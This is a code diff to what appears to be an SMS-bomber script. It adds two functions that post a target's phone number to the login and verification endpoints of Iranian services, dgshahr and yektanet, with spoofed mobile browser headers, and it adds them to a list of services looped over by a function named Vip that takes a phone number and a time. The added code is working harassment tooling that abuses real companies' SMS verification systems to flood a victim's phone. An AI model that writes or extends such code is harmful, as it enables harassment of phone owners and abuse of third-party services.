@@ -54,6 +54,83 @@ def check_internet():
 # ------------------------------
 
 
+
+
+def dgshahr(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://lend-b.dgshahr.com/user/login/"
+    
+    payload = {
+        "phone_number": formatted_phone,
+        "source": "google-organic",
+        "campaign": "undefined"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://lend-b.dgshahr.com",
+        "Referer": "https://lend-b.dgshahr.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(dgshahr) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (dgshahr) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] dgshahr Exception: {e}{a}')
+        return False
+
+
+def yektanet(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://audience.yektanet.com/api/v1/scripts/preview/validate/?app_id=5WytQQTY"
+    
+    # این API احتمالاً نیاز به پارامترهای خاصی دارد
+    # از آنجایی که Empty هست، ممکن است نیاز به بررسی بیشتر داشته باشد
+    payload = {
+        "phone": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://audience.yektanet.com",
+        "Referer": "https://audience.yektanet.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        print(f'{g}[+] Status: {response.status_code}{a}')
+        print(f'{g}[+] Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(yektanet) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (yektanet) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] yektanet Exception: {e}{a}')
+        return False
+
+
+
+
 def torobpay(phone):
     import requests
     
@@ -327,7 +404,9 @@ def Vip(phone, Time):
     candom_shop,
     missomister,
     torobpay,
-    malltina,  # اضافه کردن این خط
+    malltina,
+    dgshahr,
+    yektanet,  # اضافه کردن این خط
 ]
     total_services = len(services)
 
